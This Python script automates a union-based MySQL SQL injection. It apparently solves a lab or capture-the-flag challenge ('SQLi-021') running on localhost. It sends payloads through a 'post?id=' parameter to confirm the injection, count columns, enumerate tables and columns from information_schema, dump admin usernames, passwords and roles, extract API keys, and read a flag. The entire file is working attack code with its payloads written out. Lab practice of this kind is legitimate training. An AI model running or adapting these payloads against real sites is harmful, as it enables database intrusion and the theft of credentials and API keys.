#!/usr/bin/env python3
"""
SQLi-021: MySQL Union-based Multi Row Exploit
Automated exploitation using GROUP_CONCAT
"""

import requests
import sys
from urllib.parse import quote
import re

BASE_URL = "http://localhost:5021"

def inject(payload):
    """Send payload and return response"""
    url = f"{BASE_URL}/post?id={quote(payload)}"
    try:
        resp = requests.get(url, timeout=10)
        return resp.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_comments(html):
    """Extract comments from HTML"""
    comments = []
    pattern = r'<div class="user">(.*?)</div>\s*<div class="text">(.*?)</div>'
    matches = re.findall(pattern, html, re.DOTALL)
    for user, text in matches:
        comments.append({'user': user.strip(), 'text': text.strip()})
    return comments

def main():
    print("=" * 60)
    print("SQLi-021: MySQL Union-based Multi Row Exploit")
    print("=" * 60)
    
    # Step 1: Test injection
    print("\n[*] Step 1: Testing SQL Injection...")
    payload = "1 AND 1=1"
    html = inject(payload)
    if html and "comment" in html.lower():
        print("[+] SQL Injection confirmed!")
    
    # Step 2: Find column count
    print("\n[*] Step 2: Finding column count...")
    for i in range(1, 10):
        cols = ','.join(['NULL'] * i)
        payload = f"0 UNION SELECT {cols}-- -"
        html = inject(payload)
        if html and "error" not in html.lower():
            print(f"[+] Column count: {i}")
            break
    
    # Step 3: Enumerate tables
    print("\n[*] Step 3: Enumerating tables...")
    payload = "0 UNION SELECT 'TABLES',GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"
    html = inject(payload)
    comments = extract_comments(html)
    for c in comments:
        if c['user'] == 'TABLES':
            print(f"[+] Tables: {c['text']}")
    
    # Step 4: Enumerate admin_users columns
    print("\n[*] Step 4: Enumerating admin_users columns...")
    payload = "0 UNION SELECT 'COLS',GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='admin_users'-- -"
    html = inject(payload)
    comments = extract_comments(html)
    for c in comments:
        if c['user'] == 'COLS':
            print(f"[+] Columns: {c['text']}")
    
    # Step 5: Extract all admin users
    print("\n[*] Step 5: Extracting admin credentials...")
    payload = "0 UNION SELECT 'USERS',GROUP_CONCAT(CONCAT_WS(':',username,password,role) SEPARATOR ' | ') FROM admin_users-- -"
    html = inject(payload)
    comments = extract_comments(html)
    for c in comments:
        if c['user'] == 'USERS':
            print("[+] Admin users:")
            for user in c['text'].split(' | '):
                print(f"    {user}")
    
    # Step 6: Extract API keys
    print("\n[*] Step 6: Extracting API keys...")
    payload = "0 UNION SELECT 'KEYS',GROUP_CONCAT(CONCAT_WS(':',username,api_key) SEPARATOR ' | ') FROM admin_users-- -"
    html = inject(payload)
    comments = extract_comments(html)
    for c in comments:
        if c['user'] == 'KEYS':
            print("[+] API Keys:")
            for key in c['text'].split(' | '):
                print(f"    {key}")
    
    # Step 7: Extract flag
    print("\n[*] Step 7: Extracting flag...")
    payload = "0 UNION SELECT 'FLAG',value FROM secrets WHERE name='sqli_021'-- -"
    html = inject(payload)
    comments = extract_comments(html)
    for c in comments:
        if c['user'] == 'FLAG':
            print(f"\n[+] FLAG FOUND: {c['text']}")
    
    print("\n" + "=" * 60)
    print("Exploitation completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
